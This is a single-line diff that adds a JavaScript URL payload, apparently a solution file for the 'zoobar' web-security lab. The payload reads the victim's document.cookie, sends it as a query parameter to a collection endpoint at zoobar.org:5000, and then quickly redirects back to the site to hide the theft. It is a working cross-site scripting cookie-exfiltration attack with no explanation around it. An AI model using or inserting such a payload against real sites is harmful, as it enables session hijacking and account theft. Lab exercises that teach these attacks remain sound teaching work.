@@ -1,0 +1,1 @@
+ajavascript:{window.location='http://zoobar.org:5000/cookie?cookie=' + encodeURIComponent(document.cookie); setTimeout(function() {window.location='http://zoobar.org:5000/';}, 1)}
